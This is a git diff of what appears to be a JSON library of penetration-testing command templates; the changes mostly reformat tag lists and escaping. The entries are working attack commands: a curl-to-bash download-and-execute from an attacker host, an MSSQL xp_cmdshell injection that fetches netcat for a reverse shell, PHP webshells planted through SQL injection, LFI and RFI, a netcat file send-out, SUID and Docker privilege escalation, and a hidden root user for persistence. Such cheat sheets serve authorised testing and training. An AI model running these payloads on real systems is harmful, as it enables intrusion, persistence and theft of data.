@@ -12,7 +12,12 @@
           "subcategory": "Curl & Wget",
           "description": "Sends GET-Request with custom header and User-Agent",
           "template": "curl -i -s -H \"User-Agent: Mozilla/5.0\" -H \"X-Forwarded-For: {{ATTACKER_IP}}\" http://{{TARGET_IP}}:{{PORT}}/",
-          "tags": ["curl", "http", "headers", "web"]
+          "tags": [
+            "curl",
+            "http",
+            "headers",
+            "web"
+          ]
         },
         {
           "id": "curl_post_json",
@@ -21,7 +26,13 @@
           "subcategory": "Curl & Wget",
           "description": "Sends POST data as application/json",
           "template": "curl -X POST http://{{TARGET_IP}}:{{PORT}}/api/login -H \"Content-Type: application/json\" -d '{\"username\":\"{{USERNAME}}\",\"password\":\"{{PASSWORD}}\"}'",
-          "tags": ["curl", "post", "json", "api", "web"]
+          "tags": [
+            "curl",
+            "post",
+            "json",
+            "api",
+            "web"
+          ]
         },
         {
           "id": "curl_burp_proxy",
@@ -30,7 +41,13 @@
           "subcategory": "Curl & Wget",
           "description": "Routes the request through a local proxy on port 8080",
           "template": "curl -k -x http://127.0.0.1:8080 http://{{TARGET_IP}}:{{PORT}}/",
-          "tags": ["curl", "proxy", "burp", "zap", "debug"]
+          "tags": [
+            "curl",
+            "proxy",
+            "burp",
+            "zap",
+            "debug"
+          ]
         },
         {
           "id": "curl_download_exec",
@@ -39,7 +56,12 @@
           "subcategory": "Curl & Wget",
           "description": "Downloads a shell script from attacker server and executes it in memory",
           "template": "curl -s http://{{ATTACKER_IP}}:{{PORT}}/{{FILE_NAME}} | bash",
-          "tags": ["curl", "download", "bash", "execute"]
+          "tags": [
+            "curl",
+            "download",
+            "bash",
+            "execute"
+          ]
         },
         {
           "id": "web_http_banner_grabbing",
@@ -48,7 +70,11 @@
           "subcategory": "Recon & Discovery",
           "description": "Pulls HTTP headers and banners using curl",
           "template": "curl -vX http://{{TARGET_IP}}:{{PORT}}",
-          "tags": ["banner", "recon", "curl"]
+          "tags": [
+            "banner",
+            "recon",
+            "curl"
+          ]
         },
         {
           "id": "gobuster_dir",
@@ -57,7 +83,12 @@
           "subcategory": "Fuzzing & Discovery",
           "description": "Standard directory enumeration with SecLists and file extensions",
           "template": "gobuster dir -u http://{{TARGET_IP}}:{{PORT}}/ -w {{WORDLIST}} -x php,txt,html,js -t 50",
-          "tags": ["gobuster", "fuzzing", "discovery", "dir"]
+          "tags": [
+            "gobuster",
+            "fuzzing",
+            "discovery",
+            "dir"
+          ]
         },
         {
           "id": "ffuf_directory",
@@ -66,7 +97,12 @@
           "subcategory": "Fuzzing & Discovery",
           "description": "Fuzzing with auto-calibration and status code filter",
           "template": "ffuf -u http://{{TARGET_IP}}:{{PORT}}/FUZZ -w {{WORDLIST}} -e .php,.txt,.html -mc 200,204,301,302,307,401,403",
-          "tags": ["ffuf", "fuzzing", "web", "discovery"]
+          "tags": [
+            "ffuf",
+            "fuzzing",
+            "web",
+            "discovery"
+          ]
         },
         {
           "id": "nikto_scan",
@@ -75,7 +111,11 @@
           "subcategory": "Fuzzing & Discovery",
           "description": "Starts Nikto against a web target",
           "template": "nikto -h http://{{TARGET_IP}}:{{PORT}} | tee nikto.txt",
-          "tags": ["nikto", "vulnscan", "web"]
+          "tags": [
+            "nikto",
+            "vulnscan",
+            "web"
+          ]
         },
         {
           "id": "wpscan_enum",
@@ -84,7 +124,12 @@
           "subcategory": "Fuzzing & Discovery",
           "description": "Starts WPScan against a WordPress target",
           "template": "wpscan --url http://{{TARGET_IP}}:{{PORT}} --enumerate u,t,p | tee wpscan.txt",
-          "tags": ["wpscan", "wordpress", "vulnscan", "web"]
+          "tags": [
+            "wpscan",
+            "wordpress",
+            "vulnscan",
+            "web"
+          ]
         },
         {
           "id": "sqli_auth_bypass",
@@ -93,7 +138,13 @@
           "subcategory": "SQL Injection",
           "description": "Common login form bypass test string",
           "template": "' OR 1=1-- -",
-          "tags": ["sqli", "sql", "login", "bypass", "web"]
+          "tags": [
+            "sqli",
+            "sql",
+            "login",
+            "bypass",
+            "web"
+          ]
         },
         {
           "id": "sqli_union_version",
@@ -102,7 +153,12 @@
           "subcategory": "SQL Injection",
           "description": "Version query for MySQL / PostgreSQL / SQLite via UNION",
           "template": "' UNION SELECT 1, @@version, 3, 4-- -",
-          "tags": ["sqli", "union", "mysql", "version"]
+          "tags": [
+            "sqli",
+            "union",
+            "mysql",
+            "version"
+          ]
         },
         {
           "id": "sqli_to_shell",
@@ -111,7 +167,12 @@
           "subcategory": "SQL Injection",
           "description": "Writes a PHP backdoor via SQL injection into the web directory",
           "template": "http://{{TARGET_IP}}/index.php?vulnParam=0' UNION ALL SELECT 1,\"<?php system($_REQUEST['cmd']);?>\",2,3 INTO OUTFILE \"{{FILE_PATH}}\"-- -",
-          "tags": ["sqli", "webshell", "mysql", "rce"]
+          "tags": [
+            "sqli",
+            "webshell",
+            "mysql",
+            "rce"
+          ]
         },
         {
           "id": "sqli_sqlmap_post",
@@ -120,7 +181,12 @@
           "subcategory": "SQL Injection",
           "description": "Automated SQL injection using a saved Burp request",
           "template": "sqlmap -r {{REQUEST_FILE}} -p {{PARAMETER}} --level=5 --risk=3 --dbms=mysql --os-shell --threads 10",
-          "tags": ["sqlmap", "sqli", "automation", "burp"]
+          "tags": [
+            "sqlmap",
+            "sqli",
+            "automation",
+            "burp"
+          ]
         },
         {
           "id": "sqli_xp_cmdshell",
@@ -129,7 +195,12 @@
           "subcategory": "SQL Injection",
           "description": "Establishes a reverse shell via MSSQL xp_cmdshell injection",
           "template": "1000';+exec+master.dbo.xp_cmdshell+'(echo+open+{{ATTACKER_IP}}%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+>+c:\\ftp.txt+%26+ftp+-s:c:\\ftp.txt+%26+nc.exe+{{ATTACKER_IP}}+{{PORT}}+-e+cmd';--",
-          "tags": ["mssql", "sqli", "xp_cmdshell", "rce"]
+          "tags": [
+            "mssql",
+            "sqli",
+            "xp_cmdshell",
+            "rce"
+          ]
         },
         {
           "id": "sqlite_injection_to_shell",
@@ -138,7 +209,12 @@
           "subcategory": "SQL Injection",
           "description": "Creates a PHP shell via SQLite attachment injection",
           "template": "ATTACH DATABASE '{{FILE_PATH}}' as pwn; CREATE TABLE pwn.shell (code TEXT); INSERT INTO pwn.shell (code) VALUES ('<?php system($_REQUEST[\"cmd\"]);?>');",
-          "tags": ["sqli", "sqlite", "webshell", "rce"]
+          "tags": [
+            "sqli",
+            "sqlite",
+            "webshell",
+            "rce"
+          ]
         },
         {
           "id": "xss_test_tags",
@@ -147,7 +223,12 @@
           "subcategory": "Cross-Site Scripting (XSS)",
           "description": "Standard PoC payload for verifying XSS vulnerabilities",
           "template": "<script>alert(document.domain)</script>",
-          "tags": ["xss", "web", "alert", "javascript"]
+          "tags": [
+            "xss",
+            "web",
+            "alert",
+            "javascript"
+          ]
         },
         {
           "id": "lfi_php_wrappers",
@@ -156,7 +237,13 @@
           "subcategory": "File Inclusion (LFI)",
           "description": "Reads source code of PHP files as base64 encoded text",
           "template": "curl http://{{TARGET_IP}}:{{PORT}}/index.php?page=php://filter/convert.base64-encode/resource=index.php",
-          "tags": ["lfi", "php", "wrapper", "base64", "traversal"]
+          "tags": [
+            "lfi",
+            "php",
+            "wrapper",
+            "base64",
+            "traversal"
+          ]
         },
         {
           "id": "lfi_null_byte",
@@ -165,7 +252,12 @@
           "subcategory": "File Inclusion (LFI)",
           "description": "Classic LFI path with directory traversal",
           "template": "curl http://{{TARGET_IP}}:{{PORT}}/index.php?file=../../../../../../etc/passwd",
-          "tags": ["lfi", "traversal", "passwd", "linux"]
+          "tags": [
+            "lfi",
+            "traversal",
+            "passwd",
+            "linux"
+          ]
         },
         {
           "id": "lfi_log_poisoning_inject",
@@ -173,8 +265,13 @@
           "category": "Web Application & HTTP",
           "subcategory": "File Inclusion (LFI)",
           "description": "Injects PHP code into Apache access logs via User-Agent",
-          "template": "curl -A \"<?php passthru(\$_GET['cmd']); ?>\" http://{{TARGET_IP}}:{{PORT}}/",
-          "tags": ["lfi", "logpoisoning", "apache", "inject"]
+          "template": "curl -A \"<?php passthru($_GET['cmd']); ?>\" http://{{TARGET_IP}}:{{PORT}}/",
+          "tags": [
+            "lfi",
+            "logpoisoning",
+            "apache",
+            "inject"
+          ]
         },
         {
           "id": "lfi_log_poisoning_trigger",
@@ -183,7 +280,13 @@
           "subcategory": "File Inclusion (LFI)",
           "description": "Executes the previously injected PHP code via LFI",
           "template": "curl \"http://{{TARGET_IP}}/index.php?page={{LOG_PATH}}&cmd=id\"",
-          "tags": ["lfi", "logpoisoning", "apache", "rce", "webshell"]
+          "tags": [
+            "lfi",
+            "logpoisoning",
+            "apache",
+            "rce",
+            "webshell"
+          ]
         },
         {
           "id": "lfi_php_input_wrapper",
@@ -191,8 +294,13 @@
           "category": "Web Application & HTTP",
           "subcategory": "File Inclusion (LFI)",
           "description": "Uses php://input to execute PHP code via POST request",
-          "template": "curl -X POST --data \"<?php system(\$_GET['cmd']); ?>\" \"http://{{TARGET_IP}}/index.php?page=php://input&cmd=id\"",
-          "tags": ["lfi", "php", "input", "rce"]
+          "template": "curl -X POST --data \"<?php system($_GET['cmd']); ?>\" \"http://{{TARGET_IP}}/index.php?page=php://input&cmd=id\"",
+          "tags": [
+            "lfi",
+            "php",
+            "input",
+            "rce"
+          ]
         },
         {
           "id": "lfi_expect_wrapper",
@@ -201,7 +309,12 @@
           "subcategory": "File Inclusion (LFI)",
           "description": "Uses expect:// wrapper to execute system commands",
           "template": "curl \"http://{{TARGET_IP}}/index.php?page=expect://id\"",
-          "tags": ["lfi", "expect", "wrapper", "rce"]
+          "tags": [
+            "lfi",
+            "expect",
+            "wrapper",
+            "rce"
+          ]
         },
         {
           "id": "lfi_zip_wrapper",
@@ -209,8 +322,14 @@
           "category": "Web Application & HTTP",
           "subcategory": "File Inclusion (LFI)",
           "description": "Packs a PHP shell into a ZIP archive, renames it to .jpg and executes it via LFI",
-          "template": "echo \"<pre><?php system(\$_GET['cmd']); ?></pre>\" > {{FILE_NAME}}; zip payload.zip {{FILE_NAME}}; mv payload.zip shell.jpg",
-          "tags": ["lfi", "zip", "wrapper", "bypass", "webshell"]
+          "template": "echo \"<pre><?php system($_GET['cmd']); ?></pre>\" > {{FILE_NAME}}; zip payload.zip {{FILE_NAME}}; mv payload.zip shell.jpg",
+          "tags": [
+            "lfi",
+            "zip",
+            "wrapper",
+            "bypass",
+            "webshell"
+          ]
         },
         {
           "id": "lfi_data_wrapper",
@@ -219,7 +338,13 @@
           "subcategory": "File Inclusion (LFI)",
           "description": "Uses the data:// wrapper to execute PHP code directly",
           "template": "curl \"http://{{TARGET_IP}}/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=id\"",
-          "tags": ["lfi", "php", "data", "wrapper", "rce"]
+          "tags": [
+            "lfi",
+            "php",
+            "data",
+            "wrapper",
+            "rce"
+          ]
         },
         {
           "id": "rfi_windows_powershell",
@@ -228,7 +353,13 @@
           "subcategory": "File Inclusion (RFI)",
           "description": "Downloads nc.exe via PHP RFI and executes it as cmd shell",
           "template": "<?php system(\"powershell -Command \\\"& {(New-Object System.Net.WebClient).DownloadFile('http://{{ATTACKER_IP}}:{{PORT}}/{{FILE_NAME}}','{{FILE_NAME}}'); cmd /c {{FILE_NAME}} {{ATTACKER_IP}} {{PORT}} -e cmd.exe\\\" }\"); ?>",
-          "tags": ["rfi", "windows", "powershell", "webshell", "rce"]
+          "tags": [
+            "rfi",
+            "windows",
+            "powershell",
+            "webshell",
+            "rce"
+          ]
         },
         {
           "id": "web_upload_bypass_rename",
@@ -237,7 +368,12 @@
           "subcategory": "File Upload Bypasses",
           "description": "Rename file extension to bypass blacklisting filters",
           "template": "mv file.php file.php.jpg",
-          "tags": ["upload", "bypass", "webshell", "web"]
+          "tags": [
+            "upload",
+            "bypass",
+            "webshell",
+            "web"
+          ]
         },
         {
           "id": "web_php_in_jpeg_exiv2",
@@ -246,7 +382,13 @@
           "subcategory": "File Upload Bypasses",
           "description": "Hides PHP code in image metadata using exiv2",
           "template": "exiv2 -c'A \"<?php system($_REQUEST[\"cmd\"]);?>\"!' {{FILE_NAME}}",
-          "tags": ["upload", "exif", "php", "bypass", "steganography"]
+          "tags": [
+            "upload",
+            "exif",
+            "php",
+            "bypass",
+            "steganography"
+          ]
         },
         {
           "id": "web_php_in_jpeg_exiftool",
@@ -255,7 +397,13 @@
           "subcategory": "File Upload Bypasses",
           "description": "Hides PHP code in image metadata using exiftool",
           "template": "exiftool \"-comment<=back.php\" {{FILE_NAME}}",
-          "tags": ["upload", "exif", "php", "bypass", "steganography"]
+          "tags": [
+            "upload",
+            "exif",
+            "php",
+            "bypass",
+            "steganography"
+          ]
         },
         {
           "id": "web_htaccess_bypass",
@@ -264,7 +412,12 @@
           "subcategory": "File Upload Bypasses",
           "description": "Changes the interpretation of file extensions on the web server",
           "template": "echo \"AddType application/x-httpd-php .blah\" > .htaccess",
-          "tags": ["upload", "htaccess", "apache", "bypass"]
+          "tags": [
+            "upload",
+            "htaccess",
+            "apache",
+            "bypass"
+          ]
         },
         {
           "id": "web_put_method",
@@ -273,7 +426,12 @@
           "subcategory": "Web Exploitation",
           "description": "Uploads a file to the web server via the HTTP PUT command",
           "template": "curl -X PUT -d '<?php system($_GET[\"c\"]);?>' http://{{TARGET_IP}}:{{PORT}}/{{FILE_NAME}}",
-          "tags": ["http", "put", "upload", "webshell"]
+          "tags": [
+            "http",
+            "put",
+            "upload",
+            "webshell"
+          ]
         },
         {
           "id": "web_post_file_upload_php",
@@ -282,7 +440,12 @@
           "subcategory": "Web Exploitation",
           "description": "Curl POST request to upload a PHP file via form",
           "template": "curl -X POST -F \"file=@{{FILE_PATH}}\" http://{{TARGET_IP}}:{{PORT}}/{{ENDPOINT}} --cookie \"cookie\"",
-          "tags": ["curl", "post", "upload", "form"]
+          "tags": [
+            "curl",
+            "post",
+            "upload",
+            "form"
+          ]
         },
         {
           "id": "web_post_file_upload_zip",
@@ -291,7 +454,13 @@
           "subcategory": "Web Exploitation",
           "description": "Curl POST request to upload a ZIP file via form",
           "template": "curl -F \"field=<{{FILE_NAME}}\" http://{{TARGET_IP}}:{{PORT}}/{{ENDPOINT}} -F 'k=v' --cookie \"k=v;\" -F \"submit=true\" -L -v",
-          "tags": ["curl", "post", "upload", "form", "zip"]
+          "tags": [
+            "curl",
+            "post",
+            "upload",
+            "form",
+            "zip"
+          ]
         },
         {
           "id": "python_input_injection",
@@ -300,7 +469,11 @@
           "subcategory": "Code Execution",
           "description": "Gain RCE via unsafe Python input() functions in Python 2",
           "template": "__import__('os').system('id')",
-          "tags": ["python", "rce", "injection"]
+          "tags": [
+            "python",
+            "rce",
+            "injection"
+          ]
         }
       ]
     },
@@ -316,7 +489,13 @@
           "subcategory": "Recon & Permissions",
           "description": "Finds all executable files with the SUID bit set",
           "template": "find / -perm -u=s -type f 2>/dev/null",
-          "tags": ["linux", "suid", "privesc", "permissions", "find"]
+          "tags": [
+            "linux",
+            "suid",
+            "privesc",
+            "permissions",
+            "find"
+          ]
         },
         {
           "id": "find_writable",
@@ -325,7 +504,12 @@
           "subcategory": "Recon & Permissions",
           "description": "Finds all world-writable folders",
           "template": "find / -writable -type d 2>/dev/null | grep -v '/proc' | grep -v '/sys'",
-          "tags": ["linux", "writable", "permissions", "recon"]
+          "tags": [
+            "linux",
+            "writable",
+            "permissions",
+            "recon"
+          ]
         },
         {
           "id": "find_capabilities",
@@ -334,7 +518,12 @@
           "subcategory": "Recon & Permissions",
           "description": "Lists binaries with special Linux capabilities",
           "template": "getcap -r / 2>/dev/null",
-          "tags": ["linux", "capabilities", "privesc", "getcap"]
+          "tags": [
+            "linux",
+            "capabilities",
+            "privesc",
+            "getcap"
+          ]
         },
         {
           "id": "linux_sudo_l",
@@ -343,7 +532,12 @@
           "subcategory": "Recon & Permissions",
           "description": "Checks which commands the current user is allowed to run with sudo",
           "template": "sudo -l",
-          "tags": ["sudo", "linux", "privesc", "permissions"]
+          "tags": [
+            "sudo",
+            "linux",
+            "privesc",
+            "permissions"
+          ]
         },
         {
           "id": "locate_files",
@@ -352,7 +546,13 @@
           "subcategory": "Recon & Permissions",
           "description": "Query the local file database for quick file finding",
           "template": "locate {{FILE_NAME}}",
-          "tags": ["linux", "find", "locate", "search", "recon"]
+          "tags": [
+            "linux",
+            "find",
+            "locate",
+            "search",
+            "recon"
+          ]
         },
         {
           "id": "which_tools",
@@ -361,7 +561,12 @@
           "subcategory": "Recon & Permissions",
           "description": "Checks which transfer and exploit tools are available in PATH",
           "template": "which nc wget curl php perl python netcat tftp telnet ftp",
-          "tags": ["linux", "which", "search", "recon"]
+          "tags": [
+            "linux",
+            "which",
+            "search",
+            "recon"
+          ]
         },
         {
           "id": "find_conf_files",
@@ -370,7 +575,13 @@
           "subcategory": "Recon & Permissions",
           "description": "Search for configuration files in /etc directory",
           "template": "find /etc -iname *.conf",
-          "tags": ["linux", "find", "config", "search", "recon"]
+          "tags": [
+            "linux",
+            "find",
+            "config",
+            "search",
+            "recon"
+          ]
         },
         {
           "id": "tty_python_upgrade",
@@ -379,7 +590,13 @@
           "subcategory": "Shell Upgrades",
           "description": "Turns a dumb shell into a fully interactive TTY using Python",
           "template": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
-          "tags": ["linux", "tty", "shell", "python", "pty"]
+          "tags": [
+            "linux",
+            "tty",
+            "shell",
+            "python",
+            "pty"
+          ]
         },
         {
           "id": "tty_expect_upgrade",
@@ -388,7 +605,12 @@
           "subcategory": "Shell Upgrades",
           "description": "Alternative to Python to get an interactive shell",
           "template": "/usr/bin/expect sh",
-          "tags": ["linux", "tty", "shell", "expect"]
+          "tags": [
+            "linux",
+            "tty",
+            "shell",
+            "expect"
+          ]
         },
         {
           "id": "linux_busybox_shell",
@@ -397,7 +619,12 @@
           "subcategory": "Shell Upgrades",
           "description": "Alternative to start an interactive shell on devices without Python/Bash",
           "template": "/bin/busybox sh",
-          "tags": ["linux", "tty", "busybox", "shell"]
+          "tags": [
+            "linux",
+            "tty",
+            "busybox",
+            "shell"
+          ]
         },
         {
           "id": "restricted_shell_bypass_ssh",
@@ -406,7 +633,13 @@
           "subcategory": "Shell Upgrades",
           "description": "Method to break out of rbash by executing command via SSH",
           "template": "ssh {{USERNAME}}@{{TARGET_IP}} ls -l /tmp",
-          "tags": ["linux", "rbash", "bypass", "escape", "ssh"]
+          "tags": [
+            "linux",
+            "rbash",
+            "bypass",
+            "escape",
+            "ssh"
+          ]
         },
         {
           "id": "restricted_shell_bypass_nice",
@@ -415,7 +648,12 @@
           "subcategory": "Shell Upgrades",
           "description": "Method to break out of rbash using the nice command",
           "template": "nice /bin/bash",
-          "tags": ["linux", "rbash", "bypass", "escape"]
+          "tags": [
+            "linux",
+            "rbash",
+            "bypass",
+            "escape"
+          ]
         },
         {
           "id": "python_http_server",
@@ -424,7 +662,13 @@
           "subcategory": "File Transfers",
           "description": "Starts a fast web server to serve tools/files",
           "template": "python3 -m http.server {{PORT}}",
-          "tags": ["python", "http", "server", "transfer", "tools"]
+          "tags": [
+            "python",
+            "http",
+            "server",
+            "transfer",
+            "tools"
+          ]
         },
         {
           "id": "python2_http_server",
@@ -433,7 +677,12 @@
           "subcategory": "File Transfers",
           "description": "Starts a web server using legacy Python 2",
           "template": "python -m SimpleHTTPServer {{PORT}}",
-          "tags": ["python", "http", "server", "transfer"]
+          "tags": [
+            "python",
+            "http",
+            "server",
+            "transfer"
+          ]
         },
         {
           "id": "ruby_http_server",
@@ -442,7 +691,12 @@
           "subcategory": "File Transfers",
           "description": "Starts a web server using Ruby WEBrick",
           "template": "ruby -r webrick -e \"WEBrick::HTTPServer.new(:Port => {{PORT}}, :DocumentRoot => Dir.pwd).start\"",
-          "tags": ["ruby", "http", "server", "transfer"]
+          "tags": [
+            "ruby",
+            "http",
+            "server",
+            "transfer"
+          ]
         },
         {
           "id": "php_http_server",
@@ -451,7 +705,12 @@
           "subcategory": "File Transfers",
           "description": "Starts a web server using PHP built-in server",
           "template": "php -S 0.0.0.0:{{PORT}}",
-          "tags": ["php", "http", "server", "transfer"]
+          "tags": [
+            "php",
+            "http",
+            "server",
+            "transfer"
+          ]
         },
         {
           "id": "base64_file_transfer_sender",
@@ -460,7 +719,12 @@
           "subcategory": "File Transfers",
           "description": "Encodes a file to base64 string for clipboard transfer",
           "template": "base64 -w 0 < {{FILE_PATH}}",
-          "tags": ["base64", "transfer", "file", "linux"]
+          "tags": [
+            "base64",
+            "transfer",
+            "file",
+            "linux"
+          ]
         },
         {
           "id": "base64_file_transfer_receiver",
@@ -469,7 +733,12 @@
           "subcategory": "File Transfers",
           "description": "Decodes a base64 string back to a file",
           "template": "echo '{{BASE64_STRING}}' | base64 -d > {{FILE_PATH}} && chmod +x {{FILE_PATH}}",
-          "tags": ["base64", "transfer", "file", "linux"]
+          "tags": [
+            "base64",
+            "transfer",
+            "file",
+            "linux"
+          ]
         },
         {
           "id": "linux_ftp_transfer",
@@ -478,7 +747,12 @@
           "subcategory": "File Transfers",
           "description": "Starts an FTP server using Twistd",
           "template": "twistd -n ftp -p {{PORT}} -r {{FILE_PATH}}",
-          "tags": ["linux", "ftp", "transfer", "server"]
+          "tags": [
+            "linux",
+            "ftp",
+            "transfer",
+            "server"
+          ]
         },
         {
           "id": "linux_netcat_transfer_receiver",
@@ -487,7 +761,13 @@
           "subcategory": "File Transfers",
           "description": "Starts a listener to receive a file over Netcat",
           "template": "nc -l -p {{PORT}} > {{FILE_NAME}}",
-          "tags": ["netcat", "nc", "transfer", "file", "listener"]
+          "tags": [
+            "netcat",
+            "nc",
+            "transfer",
+            "file",
+            "listener"
+          ]
         },
         {
           "id": "linux_netcat_transfer_sender",
@@ -496,7 +776,13 @@
           "subcategory": "File Transfers",
           "description": "Sends a file to a listening Netcat receiver",
           "template": "nc {{ATTACKER_IP}} {{PORT}} < {{FILE_PATH}}",
-          "tags": ["netcat", "nc", "transfer", "file", "sender"]
+          "tags": [
+            "netcat",
+            "nc",
+            "transfer",
+            "file",
+            "sender"
+          ]
         },
         {
           "id": "registry_hive_search",
@@ -505,7 +791,11 @@
           "subcategory": "File Transfers",
           "description": "Searches offline extracted Windows Registry hives",
           "template": "hivesh {{FILE_PATH}}",
-          "tags": ["registry", "hives", "offline"]
+          "tags": [
+            "registry",
+            "hives",
+            "offline"
+          ]
         },
         {
           "id": "privesc_mysql_udf",
@@ -514,7 +804,12 @@
           "subcategory": "Privilege Escalation",
           "description": "User-defined MySQL function to execute system commands as root",
           "template": "use mysql; create table npn(line blob); insert into npn values(load_file('{{FILE_PATH}}')); select * from npn into dumpfile '{{FILE_PATH}}'; create function do_system returns integer soname '{{FILE_NAME}}'; select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell');",
-          "tags": ["mysql", "udf", "privesc", "linux"]
+          "tags": [
+            "mysql",
+            "udf",
+            "privesc",
+            "linux"
+          ]
         },
         {
           "id": "privesc_docker",
@@ -523,7 +818,12 @@
           "subcategory": "Privilege Escalation",
           "description": "Creates a Docker image to spawn a SUID bash shell on the host",
           "template": "echo -e \"FROM ubuntu:14.04\\nENV WORKDIR /stuff\\nRUN mkdir -p /stuff\\nVOLUME [ /stuff ]\\nWORKDIR /stuff\" > Dockerfile && docker build -t my-docker-image . && docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh' && ./sh -c id && ./sh",
-          "tags": ["docker", "privesc", "container", "suid"]
+          "tags": [
+            "docker",
+            "privesc",
+            "container",
+            "suid"
+          ]
         },
         {
           "id": "linux_reset_root_pw",
@@ -532,7 +832,12 @@
           "subcategory": "Privilege Escalation",
           "description": "Changes the root password directly if you have root privileges",
           "template": "echo \"{{USERNAME}}:{{PASSWORD}}\" | chpasswd",
-          "tags": ["linux", "root", "password", "privesc"]
+          "tags": [
+            "linux",
+            "root",
+            "password",
+            "privesc"
+          ]
         },
         {
           "id": "linux_create_root_user",
@@ -541,7 +846,12 @@
           "subcategory": "Privilege Escalation",
           "description": "Creates a hidden user with UID 0 (root)",
           "template": "useradd -u0 -g0 -o -s /bin/bash -p `openssl passwd {{PASSWORD}}` {{USERNAME}}",
-          "tags": ["linux", "persistence", "root", "useradd"]
+          "tags": [
+            "linux",
+            "persistence",
+            "root",
+            "useradd"
+          ]
         }
       ]
     },
@@ -557,7 +867,12 @@
           "subcategory": "Recon & Privileges",
           "description": "Checks privileges (e.g., SeImpersonatePrivilege) and groups",
           "template": "whoami /priv",
-          "tags": ["windows", "whoami", "privileges", "recon"]
+          "tags": [
+            "windows",
+            "whoami",
+            "privileges",
+            "recon"
+          ]
         },
         {
           "id": "win_whoami_groups",
@@ -566,7 +881,12 @@
           "subcategory": "Recon & Privileges",
           "description": "Checks current group memberships",
           "template": "whoami /groups",
-          "tags": ["windows", "whoami", "groups", "recon"]
+          "tags": [
+            "windows",
+            "whoami",
+            "groups",
+            "recon"
+          ]
         },
         {
           "id": "win_net_enum_users",
@@ -575,7 +895,12 @@
           "subcategory": "Recon & Privileges",
           "description": "Lists all local user accounts",
           "template": "net user",
-          "tags": ["windows", "net", "users", "recon"]
+          "tags": [
+            "windows",
+            "net",
+            "users",
+            "recon"
+          ]
         },
         {
           "id": "win_net_enum_admins",
@@ -584,7 +909,12 @@
           "subcategory": "Recon & Privileges",
           "description": "Lists members of the local administrator group",
           "template": "net localgroup administrators",
-          "tags": ["windows", "net", "users", "administrators"]
+          "tags": [
+            "windows",
+            "net",
+            "users",
+            "administrators"
+          ]
         },
         {
           "id": "win_find_writable",
@@ -592,8 +922,13 @@
           "category": "Windows & PowerShell",
           "subcategory": "Recon & Privileges",
           "description": "PowerShell script to find files with write access for 'Authenticated Users'",
-          "template": "$a = Get-ChildItem \"c:\\windows\\\" -recurse -ErrorAction SilentlyContinue; $a | % { $fileName = $_.fullname; $acls = get-acl $fileName -ErrorAction SilentlyContinue | select -exp access | ? {$_.filesystemrights -match \"full|modify|write\" -and $_.identityreference -match \"authenticated users|everyone|$env:username\"}; if($acls -ne $null) { [pscustomobject]@{ filename = $fileName; user = $acls | select -exp identityreference } } }",
-          "tags": ["windows", "powershell", "writable", "recon"]
+          "template": "$a = Get-ChildItem \"c:\\\\windows\\\\\" -recurse -ErrorAction SilentlyContinue; $a | % { $fileName = $_.fullname; $acls = get-acl $fileName -ErrorAction SilentlyContinue | select -exp access | ? {$_.filesystemrights -match \"full|modify|write\" -and $_.identityreference -match \"authenticated users|everyone|$env:username\"}; if($acls -ne $null) { [pscustomobject]@{ filename = $fileName; user = $acls | select -exp identityreference } } }",
+          "tags": [
+            "windows",
+            "powershell",
+            "writable",
+            "recon"
+          ]
         },
         {
           "id": "win_check_applocker_ps",
@@ -602,7 +937,13 @@
           "subcategory": "Recon & Privileges",
           "description": "Lists AppLocker rules via PowerShell to understand whitelisting",
           "template": "(Get-AppLockerPolicy -Local).RuleCollections",
-          "tags": ["windows", "applocker", "whitelisting", "recon", "powershell"]
+          "tags": [
+            "windows",
+            "applocker",
+            "whitelisting",
+            "recon",
+            "powershell"
+          ]
         },
         {
           "id": "win_check_applocker_reg",
@@ -610,8 +951,14 @@
           "category": "Windows & PowerShell",
           "subcategory": "Recon & Privileges",
           "description": "Lists AppLocker rules via Registry to understand whitelisting",
-          "template": "reg query HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\SrpV2\\Exe\\",
-          "tags": ["windows", "applocker", "whitelisting", "recon", "registry"]
+          "template": "reg query HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\SrpV2\\Exe\\\\",
+          "tags": [
+            "windows",
+            "applocker",
+            "whitelisting",
+            "recon",
+            "registry"
+          ]
         },
         {
           "id": "win_writable_dirs_applocker",
@@ -620,7 +967,12 @@
           "subcategory": "Recon & Privileges",
           "description": "Check known directories often used as AppLocker bypass",
           "template": "dir C:\\Windows\\Tasks C:\\Windows\\Temp C:\\windows\\tracing C:\\Windows\\System32\\FxsTmp C:\\Windows\\System32\\spool\\PRINTERS",
-          "tags": ["applocker", "bypass", "windows", "directories"]
+          "tags": [
+            "applocker",
+            "bypass",
+            "windows",
+            "directories"
+          ]
         },
         {
           "id": "win_ps_logging_check",
@@ -629,7 +981,12 @@
           "subcategory": "Recon & Privileges",
           "description": "Checks if PowerShell ScriptBlock Logging or Transcription is active",
           "template": "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",
-          "tags": ["powershell", "logging", "recon", "windows"]
+          "tags": [
+            "powershell",
+            "logging",
+            "recon",
+            "windows"
+          ]
         },
         {
           "id": "win_audit_policies",
@@ -638,7 +995,11 @@
           "subcategory": "Recon & Privileges",
           "description": "Lists all audit policies of the system",
           "template": "auditpol /get /category:*",
-          "tags": ["windows", "audit", "recon"]
+          "tags": [
+            "windows",
+            "audit",
+            "recon"
+          ]
         },
         {
           "id": "win_check_lsass_ppl",
@@ -647,7 +1008,12 @@
           "subcategory": "Recon & Privileges",
           "description": "Checks if LSA is running as Protected Process Light (prevents Mimikatz)",
           "template": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL",
-          "tags": ["windows", "lsass", "mimikatz", "recon"]
+          "tags": [
+            "windows",
+            "lsass",
+            "mimikatz",
+            "recon"
+          ]
         },
         {
           "id": "win_hidden_files",
@@ -656,7 +1022,12 @@
           "subcategory": "Recon & Privileges",
           "description": "Finds hidden files in Program Files",
           "template": "dir /A:H /s \"c:\\program files\"",
